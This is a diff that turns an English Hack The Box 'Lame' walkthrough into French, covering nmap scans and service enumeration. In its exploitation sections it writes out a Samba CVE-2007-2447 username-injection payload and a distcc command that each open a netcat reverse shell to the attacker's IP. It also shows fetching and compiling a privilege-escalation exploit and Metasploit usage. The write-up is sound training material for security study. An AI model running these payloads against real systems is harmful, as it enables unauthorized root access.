@@ -1,3 +1,5 @@
+Lame_French
+
 Lame
 
  -------------------------------------
@@ -9,118 +11,111 @@ La machine que je vais tenter d'exploiter est une machine Linux appelée "Lame".
 
 Pour cette machine, on nous donne l'adresse IP 10.10.10.3. Je vais commencer par exécuter quelques analyses nmap pour obtenir plus d'informations sur la cible et voir si je peux trouver un point d'entrée potentiel
 
-### ****Scanning****
+### ****Balayage****
 
-- **Nmap Scan**
+- **Analyse Nmap**
 	- Command 
 	`sudo nmap -sC -sV -T4 -O -v -oA lame 10.10.10.3`
-		- `-sC`: run default nmap scripts
-		- `-T4`: Set timing template (higher is faster)
-		- `-O`: Detect OS
-		- `sV`: detect service version
-		- `-v`: Verbose
-		- `-oA`: Output all files formats to name "lame"
+		- `-sC`: exécuter les scripts nmap par défaut
+		- `-T4`: Définir le modèle de synchronisation (plus élevé est plus rapide)
+		- `-O`: Détecter le système d'exploitation
+		- `sV`: détecter la version du service
+		- `-v`: Verbeuse
+		- `-oA`: Sortez tous les formats de fichiers au nom "lame"
 	
 
-Running the initial nmap scan showed 4 open ports on the target machine
+L'exécution de l'analyse nmap initiale a montré 4 ports ouverts sur la machine cible
 
-- **Port 21**: Running File Transfer Protocol (FTP). The specific version is vsFTPd 2.3.4. Also noted that anonymous login is allowed.
-- **Port 22**: Running SSH. The specific version is OpenSSH version 4.7p1.
-- **Port 139 and 445**: Running Samba smbd 3.X - 4.X. Didn't get a specific version.
+- **Port 21** : Exécution du protocole de transfert de fichiers (FTP). La version spécifique est vsFTPd 2.3.4. Notez également que la connexion anonyme est autorisée.
+- **Port 22** : Exécution de SSH. La version spécifique est OpenSSH version 4.7p1.
+- **Port 139 et 445** : Exécution de Samba smbd 3.X - 4.X. Je n'ai pas eu de version spécifique.
 
-Before I start diving deeper into these ports, I'm going to run another scan to check for all ports just to ensure that I'm not missing any other services.
+Avant de commencer à trouver plus d'informations sur ces ports, je vais lancer une autre analyse pour vérifier tous les ports afin de m'assurer qu'aucun autre service ne me manque.
 
-- **Deep Scan**
+- **Analyse approfondie**
 	- Command
 	`nmap -sC -sV -p- -T4 -O -oA lame_deep 10.10.10.3`
 	
-Here are the results of the scan
+Voici les résultats du scan
 
 
+![Screenshot from 2021-04-19 10-03-20.png](../_resources/6e6831397e194ba2b6c31ab1ce77fab0.png)
 
-![Screenshot from 2021-04-19 10-03-20.png](../_resources/f3a83f8998c74af6b431459037cf34df.png)
-
-There is a new port that didn't show up in the initial nmap scan. This is due to port 3632 not being a common port.
+Il y a un nouveau port qui n'est pas apparu dans l'analyse nmap initiale. Cela est dû au fait que le port 3632 n'est pas un port commun.
 
 - **Port 3632**: Running distccd v1 4.2.4. A service that I am not familiar with.
 
-Now to be thorough I'm going to run a a UDP scan to see if anything is open.
+Maintenant, pour être complet, je vais lancer une analyse UDP pour voir si d'autre port sont ouverts.
 
-- **UDP Scan**
+- **Analyse UDP**
 	- Command
 	`nmap -sU -p- -T4 -O -oA lame_UDP 10.10.10.3`
 	
-The scan resulted in all ports being closed.
+l'analyse n'a abouti à aucun autre port ouvert
 
+![Screenshot from 2021-04-20 11-30-46.png](../_resources/ed321ff31f74486985e68319cf3b445a.png)
 
-
-![Screenshot from 2021-04-20 11-30-46.png](../_resources/ba195c3b1ed04317a1bb132addef3a0a.png)
-
-In conclusion, we have four potential entry points into this machine.
+En conclusion, nous avons quatre points d'entrée potentiels dans cette machine.
 
 --------------------------------------------
 --------------------------------------------
-# Enumeration
+# Énumération
 
-Now let's dive deeper into these services and see if we can find any vulnerabilities or misconfigurations
+Maintenant, approfondissons ces services et voyons si nous pouvons trouver des vulnérabilités ou des erreurs de configuration.
 
 ## **Port 21 vsFTPd 2.3.4**
 
-Now let use the best "hacking" tool that exists... Google. Google shows us that it is in fact a vulnerable verison and is vulnerable to remote code excution. 
+Maintenant, utilisons le meilleur outil de "piratage" qui existe... Google. Google nous montre qu'il s'agit en fait d'une version vulnérable et vulnérable à l'exécution de code à distance.
 
-- ***Vulnerabily Explanation***
-To exploit this vulnerability we need to trigger the malicious function `vsf_sysutil_extra();` function by sending a sequence of specific bytes. If the execution is successful it should open a backdoor on port 6200 of the vulnerable system.
+- ***Explication de la vulnérabilité***
+Pour exploiter cette vulnérabilité, nous devons déclencher la fonction malveillante `vsf_sysutil_extra();` en envoyant une séquence d'octets spécifiques. Si l'exécution réussit, il devrait ouvrir une porte dérobée sur le port 6200 du système vulnérable.
 
-- ***nmap script scan***
-To verify that it is vulnerable to this attack lets use an nmap script 
-
-
+- ***analyse de script nmap***
+Pour vérifier qu'il est vulnérable à cette attaque, utilisons un script nmap
 
 
 
-![Screenshot from 2021-04-20 12-08-27.png](../_resources/09af72eaf241473f8081ddc2f875b381.png)
 
-After running the script, the ouput shows up that this is not vulnerable to the exploit.
+![Screenshot from 2021-04-20 12-08-27.png](../_resources/10210db590e04af4bffadbb453b70e14.png)
+
+Après avoir exécuté le script, la sortie montre que ce n'est pas vulnérable à l'exploit.
 
 
-
-![Screenshot from 2021-04-22 09-15-56.png](../_resources/27b663fa4c1b472fb4265e1c1737aebf.png)
+![Screenshot from 2021-04-22 09-15-56.png](../_resources/f8a681ea00ac43258d7abfef985f7401.png)
 
 ## **Port 22 OpenSSH v4.7p1**
 
-Taking a quick look at Google didn't list any notable results results. 
+En jetant un coup d'œil rapide à Google, aucun résultat notable n'a été répertorié.
 
-Looking at the nmap scripts we have a few options. We could potentially bruteforce SSH. However, we could get locked out or it could take a long time and list no results. I'll keep this as a last resort 
+En regardant les scripts nmap, nous avons quelques options. Nous pourrions potentiellement bruteforcer SSH. Cependant, nous pourrions être bloqués ou cela pourrait prendre beaucoup de temps et ne lister aucun résultat. je garde ça en dernier recours.
 
 
-
-![Screenshot from 2021-04-22 09-29-27.png](../_resources/9485fba7f58740db895fddfb5c790604.png)
+![Screenshot from 2021-04-22 09-29-27.png](../_resources/f1590742c8eb4d269ef47c6935de3386.png)
 
 ## **Port 139 and 445 Samba smbd 3.X - 4.X**
 
-This is the only service that we didn't get a specific version for. However, these ports are commonly misconfigured and/or vulnerable. Lets take a look.
+C'est le seul service pour lequel nous n'avons pas obtenu de version spécifique. Cependant, ces ports sont généralement mal configurés et/ou vulnérables. Nous allons jeter un coup d'oeil.
 
-We know that it's running an SMB server, I'll use SMB client to get the specific version.
+Nous savons qu'il exécute un serveur SMB, j'utiliserai le client SMB pour obtenir la version spécifique.
 
-- **SMB Client Fix**
-	- I was getiing the error below while trying to connect to the server using `smbclient`
-![Screenshot from 2021-04-22 09-51-18.png](../_resources/571a7228aeca40d4a513a55378c3e295.png)
-	- Running a quick Google search I was able to find a solution. I had to add the line `client min protocol = NT1` to the `etc/samba/smb.conf` file under the global section (see screenshot below)
-![Screenshot from 2021-04-22 09-55-38.png](../_resources/40805190e3fa452e8d6e25072af43f2d.png)
+- **Correctif client SMB**
+	-  J'obtenais l'erreur ci-dessous en essayant de me connecter au serveur à l'aide de `smbclient`
+![Screenshot from 2021-04-22 09-51-18.png](../_resources/b820d9298c3b4bb79069ce8bca81369f.png)
+- En effectuant une recherche rapide sur Google, j'ai pu trouver une solution. J'ai dû ajouter la ligne `client min protocol = NT1` au fichier `etc/samba/smb.conf` sous la section globale (voir capture d'écran ci-dessous)
+![Screenshot from 2021-04-22 09-55-38.png](../_resources/fb9083b77dac4402aee70e28abfa1eeb.png)
 
 
-Now that we have `smbclient` running again let's try connecting.
-
+Maintenant que `smbclient` fonction encore, on peut essayer la commande.
 `smbclient -L 10.10.10.3`
 
 - `-L`: lists what services are available on a server
 
-We succesfully connected and now have a specific version: **Samba 3.0.20-Debian**
+Nous nous sommes connectés avec succès et avons maintenant une version spécifique : **Samba 3.0.20-Debian**
 
-![Screenshot from 2021-04-22 10-10-18.png](../_resources/21c0cc4c436f4081a198ddbdfda778c3.png)
+![Screenshot from 2021-04-22 10-10-18.png](../_resources/13fc978189b94844b4e16191eb03bce5.png)
 
 
-Now before we go any further let's see what permissions we have on the share drives.
+Maintenant, avant d'aller plus loin, voyons quelles autorisations nous avons sur les disques partagés.
 
 `sudo ./smbmap.py -H 10.10.10.3 `
 
@@ -128,33 +123,31 @@ Now before we go any further let's see what permissions we have on the share dri
 - `-H`: IP of the host
 
 
-![Screenshot from 2021-04-22 10-24-17.png](../_resources/a9477331c2de4c8099f32a90cf70fce0.png)
+![Screenshot from 2021-04-22 10-24-17.png](../_resources/db094d4ede2d4418b45e8a4008817db5.png)
 
-As you can see we have READ and WRITE access to the tmp folder.
+Comme vous pouvez le voir, nous avons un accès en READ et en WRITE au dossier tmp.
 
-Now that we have the smb version, let search for it on Google. I found a ton of vulnerabilitie and we could esially expoit this with metasploit. However, I would like to exploit this without using metasploit as I'm preparing for the OSCP. Don't worry though I will show the metasploit exploitation as well.
+Maintenant que nous avons la version smb, recherchons-la sur Google. J'ai trouvé une tonne de vulnérabilités et nous pourrions facilement les exploiter avec metasploit. Cependant, je voudrais exploiter cela sans utiliser metasploit car je me prépare pour l'OSCP. Ne vous inquiétez pas, je vais également montrer l'exploitation du métasploit.
 
-I found CVE-2007–2447 which I  can exploit without using metasploit and get root access. By looking at the metasploit script we can see the paylad is actually very simple. All we need to do is replace the *payload.encoded" with out payload.
+J'ai trouvé CVE-2007-2447 que je peux exploiter sans utiliser metasploit et obtenir un accès root. En regardant le script metasploit, nous pouvons voir que le charge utile est en fait très simple. Tout ce que nous avons à faire est de remplacer le *payload.encoded" avec notred charge utile.
 
 ``username = "/=`nohup " + payload.encoded + "`"``
 
-The payload exploits the username field as the fild allowed you to enter metacharacters so that we can inject our payload. Before exploiting this lets check the last service.
+La charge utile exploite le champ du nom d'utilisateur car le champ vous a permis d'entrer des métacaractères afin que nous puissions injecter notre charge utile. Avant d'exploiter cela, vérifions le dernier service.
 
-
-*note: had to download smbmap directly from github as the lastest debian package was not working* 
+*remarque : j'ai dû télécharger smbmap directement depuis github car le dernier paquet Debian ne fonctionnait pas*
 
 ## **Port 3632 distccd v1 4.2.4**
 
-Running a quick Google search on this version shows us that it is vulnerable. There is even and nmap scipt for it, so let's run that.
+Faire une recherche rapide sur Google sur cette version nous montre qu'elle est vulnérable. Il y a même un nmap scipt pour cela, alors exécutons-le.
 
 `nmap -p 3632 --script distcc-cve2004-2687 10.10.10.3`
 
-Looking at the results of the scan show us that it is vulnerable.
+L'examen des résultats de l'analyse nous montre qu'il est vulnérable.
 
+![Screenshot from 2021-04-26 14-03-03.png](../_resources/f9fe957d514a4817b09104d12cdb1084.png)
 
-![Screenshot from 2021-04-26 14-03-03.png](../_resources/6b9914a8414d45f0b1d1e890b44ada4c.png)
-
-We're going to try and exploit both vulnerabilities that we found
+Nous allons essayer d'exploiter les deux vulnérabilités que nous avons trouvées
 
 ----------------------------------------------------------------------------------------------------------------
 
@@ -163,92 +156,85 @@ We're going to try and exploit both vulnerabilities that we found
 
 ## Samba
 
-Lets open up a listener on our host machine.
+Ouvrons un écouteur sur votre machine hôte.
 
 `nc -lvnp 4444`
 
-Now I'm going to login to the smb client
+Maintenant je vais me connecter au client smb.
 
 `smbclient //10.10.10.3/tmp`
 
 
-![Screenshot from 2021-04-26 14-09-48.png](../_resources/44471f33bacb457a828536fbf9da5e44.png)
+![Screenshot from 2021-04-26 14-09-48.png](../_resources/e68b2413b49b435b9aebb9baf4cb7bb2.png)
 
-Now let run our exploit.
+Laissons maintenant exécuter notre exploit.
 
 ``logon "/=`nohup nc -nv 10.10.14.14 4444 -e /bin/bash`"``
 
-Perfect we got our reverse shell and we're root, No priviledge escalation needed.
+Parfait, nous avons notre shell inversé et nous sommes root, aucune élévation de privilèges n'est nécessaire.
 
-
-![Screenshot from 2021-04-26 14-11-18.png](../_resources/a77ee9b05e7041fdbfaca002b714cd78.png)
+![Screenshot from 2021-04-26 14-11-18.png](../_resources/54d7e8fecd6b4d34afb8574d53090508.png)
 
 
 ## distccd v1 4.2.4
 
-Now let try our potential second point of entry. We can use the nmap script to exploit this vulnerbaility as well, since we know that it is vulnerable to CVE 2004–2687.
+Essayons maintenant notre deuxième point d'entrée potentiel. Nous pouvons également utiliser le script nmap pour exploiter cette vulnérabilité, car nous savons qu'il est vulnérable à CVE 2004-2687.
 
-Lets set up our listener
+Mettons en place notre écouteur
 
 `nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.14 4444 -e /bin/bash'"`
 
-We got our reverse shell, however we are not root so we will need to do some priviledge escalation.
+Nous avons obtenu notre shell inversé, mais nous ne sommes pas root, nous devrons donc faire une escalade des privilèges.
 
 
+![Screenshot from 2021-04-27 09-29-34.png](../_resources/ae4a7e1e89f7417fa10f31ceff0d2ccf.png)
 
-![Screenshot from 2021-04-27 09-29-34.png](../_resources/d85fdbcfb98e42fc861b65f2247af838.png)
-
-Let find our linux version out. 
-
+Laissez découvrir la version Linux.
 
 
-![Screenshot from 2021-04-27 09-33-34.png](../_resources/2619fb79bd3d4d868fe61150134720fe.png)
+![Screenshot from 2021-04-27 09-33-34.png](../_resources/3b54d174d85e409b9a7777b287cae747.png)
 
-I tried a few priviledge escalations from exploitdb with no luck. After digging around Google for a bit I was able to find an priviledge escalation that might work.
+J'ai essayé quelques escalades de privilèges depuis exploitdb sans succès. Après avoir fouillé un peu dans Google, j'ai pu trouver une escalade de privilèges qui pourrait fonctionner.
 
-First step is to set up a server
+La première étape consiste à configurer un serveur
 
 `python -m SimpleHTTPServer 8090`
 
-Now on the target machine i'll download the exploit from exploitdb
+Maintenant, sur la machine cible, je vais télécharger l'exploit depuis exploitdb
 
 `wget http://10.10.14.14:8090/8572.c`
 
-Since it's a C file we need to compile it using gcc.
+Comme il s'agit d'un fichier C, nous devons le compiler en utilisant gcc.
 
 `gcc 8572.c -o 8572`
 
-Let look at the usage before we execute the file.
+Regardons l'utilisation avant d'exécuter le fichier.
 
+![Screenshot from 2021-04-30 22-55-55.png](../_resources/29f22d7256c747a683e420b8e24e826c.png)
 
-![Screenshot from 2021-04-30 22-55-55.png](../_resources/507b385b0e5b4fb8b0722120df5d2b2a.png)
+Il y a plusieurs choses que nous devrons faire pour que cela fonctionne.
 
-There's ac ouple things that we will need to do to get this to work.
+- trouver le PID id le netlink udevd
+- Mettez un paylod dans le forder /tmp et il fonctionnera en tant que root.
 
-- find the PID id the udevd netlink
-- Put a paylod in the /tmp forder and it will run as root.
-
-Let's find the PID of the udevd using the command below:
+Trouvons le PID de l'udevd à l'aide de la commande ci-dessous :
 
 `ps -aux | grep devd`
 
-Here we find our PID.
+Ici, nous trouvons notre PID.
 
-![Screenshot from 2021-04-30 23-27-20.png](../_resources/c4f2dad4b5d44fbd8f44835bf36da36d.png)
+![Screenshot from 2021-04-30 23-27-20.png](../_resources/4caf63be83964f629b5719ee3ed86ee8.png)
 
-Now lets create a quick srcipt that will give us a reverse shell when it's ran in the /tmp folder.
+Créons maintenant un script rapide qui nous donnera un shell inversé lorsqu'il sera exécuté dans le dossier /tmp.
 
-
-![Screenshot from 2021-04-30 23-40-54.png](../_resources/fc7022d85fb84bd9bf44cee04d5af25a.png)
-
-
-Now let open up a listener on our machine.
-
-After running this eploit several times with different payloads I was not able to get the reverse shell. For some reason the exploit was not running my run file at all. Looked up some solutions after trying for a while and was still not able to get the priviledge escalation. Could be the machine acting up. will try again in the future.
-
-*Update: After reseting the machine I was able to get the root
+![Screenshot from 2021-04-30 23-40-54.png](../_resources/2f5e4fcbc64e42568c264a28e8d42300.png)
 
 
+Maintenant, ouvrons un écouteur sur notre machine.
+
+Après avoir exécuté cet eploit plusieurs fois avec différentes charges utiles, je n'ai pas pu obtenir le shell inverse. Pour une raison quelconque, l'exploit n'exécutait pas du tout mon fichier d'exécution. J'ai cherché des solutions après avoir essayé pendant un certain temps et je n'ai toujours pas pu obtenir l'augmentation des privilèges. Peut-être que la machine agit. réessayera à l'avenir.
+
+*Mise à jour : après avoir réinitialisé la machine, j'ai pu obtenir root
 
 
 
@@ -256,13 +242,11 @@ After running this eploit several times with different payloads I was not able t
 ## Metasploit Exploitation
 
 
-After stating up metasploit I searched for samba vulnerabilities. A few results were listed as you can see below 
+Après avoir déclaré metasploit, j'ai recherché des vulnérabilités de samba. Quelques résultats ont été répertoriés comme vous pouvez le voir ci-dessous
 
+![Screenshot from 2021-04-17 13-46-36.png](../_resources/b109047307fe4e4baeefa41294d7f3c9.png)
 
-![Screenshot from 2021-04-17 13-46-36.png](../_resources/bbd58b3fdcd74b79875ee6ef9783a011.png)
-
-I decided to use the exploit listed below first as it is listed as excelent
-
+J'ai décidé d'utiliser d'abord l'exploit répertorié ci-dessous car il est répertorié comme excellent
 `exploit/multi/samba/usermap_script`
 
 	
@@ -271,21 +255,20 @@ I decided to use the exploit listed below first as it is listed as excelent
 	1. `use 4`
 	2. `show OPTIONS`
 	
-	![Screenshot from 2021-04-17 13-52-33.png](../_resources/c640a8652a094e688c9ec1370f2020d4.png)
+	![Screenshot from 2021-04-17 13-52-33.png](../_resources/a8008858d959461d95993304ac6c6fcd.png)
 	
 	3. `set RHOST 10.10.10.3`
 	4. `set LHOST tun0` (OVPN Interface)
 	5. `exploit`
 
-Now we have the reverse shell using the `cmd/unix/reverse_netcat` payload.
+Nous avons maintenant le shell inversé utilisant la charge utile `cmd/unix/reverse_netcat`.
 
 
-
-![Screenshot from 2021-04-17 14-30-52.png](../_resources/df755de6edfa43cb82154390c15df0c1.png)
+![Screenshot from 2021-04-17 14-30-52.png](../_resources/f759c3feef8e4447a7e9476774b40563.png)
 
 --------------------------------------------------------
 
-## Getting the Flag
+## Obtenir le drapeau
 
 - User Flag
 	- `cd /`
@@ -294,7 +277,7 @@ Now we have the reverse shell using the `cmd/unix/reverse_netcat` payload.
 	- `cat user.txt`
 
 
-![Screenshot from 2021-04-17 14-39-18.png](../_resources/28a1d62d57e24676a7c04a218eed2640.png)
+![Screenshot from 2021-04-17 14-39-18.png](../_resources/9c8272696bca4e40af4efd7039bdb879.png)
 
 
 
@@ -304,7 +287,7 @@ Now we have the reverse shell using the `cmd/unix/reverse_netcat` payload.
 	- `cat root.txt`
 
 
-![Screenshot from 2021-04-17 14-35-33.png](../_resources/7e1a49c811494c3db756645df8a4e12a.png)
+![Screenshot from 2021-04-17 14-35-33.png](../_resources/bd144cc3359d43a0a8c511146b272e99.png)
 
 
 
